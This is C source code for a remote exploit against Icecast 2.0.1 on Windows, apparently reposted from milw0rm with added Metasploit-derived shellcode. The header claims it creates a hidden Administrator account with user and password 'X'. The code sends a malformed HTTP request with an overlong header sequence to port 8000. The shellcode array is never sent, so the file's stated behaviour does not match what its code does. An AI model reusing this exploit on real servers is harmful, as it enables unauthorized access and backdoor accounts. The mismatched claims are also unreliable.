/*
ICECAST 2.0.1 WiN32 REMOTE EXPLOiT

by Luigi Auriemma

Modded by:

**************************
******* LORDKAOZ *********
*** OF IMPERATORI TEAM ***
**************************
Greetz to marc0z, m3nTe, DarKBad, OuT, FaX (Anche se non se lo merita), MeSSiA e eXpLoIt!

This exploit will add an Administrator account with USER: X AND PASSWORD: X

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <netinet/in.h>
#endif



#define VER     "0.1"
#define PORT    8000
#define BUFFSZ  2048
#define TIMEOUT 3
#define EXEC    "GET / HTTP/1.0\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "\xcc" 

char shellcode[] =
"\x66\x81\xec\x80\x00\x89\xe6\xe8\xb7\x00\x00\x00\x89\x06\x89\xc3"
"\x53\x68\x7e\xd8\xe2\x73\xe8\xbd\x00\x00\x00\x89\x46\x0c\x53\x68"
"\x8e\x4e\x0e\xec\xe8\xaf\x00\x00\x00\x89\x46\x08\x31\xdb\x53\x68"
"\x70\x69\x33\x32\x68\x6e\x65\x74\x61\x54\xff\xd0\x89\x46\x04\x89"
"\xc3\x53\x68\x5e\xdf\x7c\xcd\xe8\x8c\x00\x00\x00\x89\x46\x10\x53"
"\x68\xd7\x3d\x0c\xc3\xe8\x7e\x00\x00\x00\x89\x46\x14\x31\xc0\x31"
"\xdb\x43\x50\x68\x72\x00\x73\x00\x68\x74\x00\x6f\x00\x68\x72\x00"
"\x61\x00\x68\x73\x00\x74\x00\x68\x6e\x00\x69\x00\x68\x6d\x00\x69"
"\x00\x68\x41\x00\x64\x00\x89\x66\x1c\x50\x68\x58\x00\x00\x00\x89"
"\xe1\x89\x4e\x18\x68\x00\x00\x5c\x00\x50\x53\x50\x50\x53\x50\x51"
"\x51\x89\xe1\x50\x54\x51\x53\x50\xff\x56\x10\x8b\x4e\x18\x49\x49"
"\x51\x89\xe1\x6a\x01\x51\x6a\x03\xff\x76\x1c\x6a\x00\xff\x56\x14"
"\xff\x56\x0c\x56\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c"
"\xad\x8b\x40\x08\x5e\xc2\x04\x00\x53\x55\x56\x57\x8b\x6c\x24\x18"
"\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01"
"\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38"
"\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1"
"\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04"
"\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d\x5b\xc2\x08\x00";



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u_short port = PORT;
    u_char  buff[BUFFSZ];


    setbuf(stdout, NULL);

    fputs("\n"
        "Icecast <= 2.0.1 Win32 remote code execution "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
		"*************************************\n"
		"SHELLCODE ADDED BY LORDKAOZ\n"
		"OF #IMPERATORI\n"
		"*************************************\n"
		"SHELLCODE BASED ON WIN32_ADDUSER\n"
		"BY METASPLOIT GROUP\n"
		"*************************************\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUsage: %s <server> [port(%d)]\n"
            "\n"
            "THiS iS A POC EXPLOIT BY Luigi Auriemma\n"
			"AND MODDED BY LORDKAOZ WITH AN ADMINISTRATOR X/X ADDUSER\n"
			"BASED ON METASPLOIT SHELLCODE\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("\n- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    fputs("- send malformed data\n", stdout);
    if(send(sd, EXEC, sizeof(EXEC) - 1, 0)
      < 0) std_err();

    if((timeout(sd) < 0) || (recv(sd, buff, BUFFSZ, 0) < 0)) {
        fputs("\nThe Server Is Vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer Doesn't Seem To Be Vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Cannot Resolve Hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2004-10-12]
